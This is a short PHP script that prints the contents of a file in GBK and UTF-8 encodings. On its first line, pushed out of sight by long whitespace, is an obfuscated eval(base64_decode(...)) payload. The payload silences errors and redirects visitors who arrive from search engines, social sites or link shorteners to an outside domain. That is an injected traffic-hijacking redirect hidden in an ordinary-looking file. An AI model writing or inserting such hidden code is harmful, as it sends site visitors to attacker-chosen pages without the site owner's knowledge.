<?php	                                                                                                                                	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsNCmlmICghJHFhenBsbSl7DQokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107DQokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmICgkdWFnKSB7DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpew0KCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9zdGJqYnBpci5vc2EucGwvIik7DQoJZXhpdCgpOw0KfQ0KfQ0KCX0NCgl9"));
$f = fopen("123","r");
$text = fread($f,filesize("123"));
echo $text;
echo "\n";
$text = mb_convert_encoding($text, "UTF-8","GBK");
echo $text;
echo "\n";
$text = mb_convert_encoding($text, "GBK","UTF-8");
echo $text;
echo "\n";

?>
